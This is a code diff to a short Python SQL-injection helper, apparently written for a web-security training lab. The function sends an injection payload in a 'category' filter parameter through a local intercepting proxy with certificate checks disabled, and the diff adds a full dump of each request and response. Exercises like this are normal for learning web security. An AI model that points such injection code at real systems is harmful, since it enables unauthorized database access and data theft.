@@ -1,14 +1,19 @@
 import requests
 import sys
 import urllib3
+from requests_toolbelt.utils import dump
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_sqli(url, payload):
-    uri = '/filter?category='
-    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
-    if "Cat Grin" in r.text:
+    path = 'filter?category='
+    r = requests.get(url + path + payload, verify=False, proxies=proxies)
+    
+    data = dump.dump_all(r)
+    print(data.decode('utf-8'))
+
+    if ".svg" in r.text:
         return True
     else:
         return False
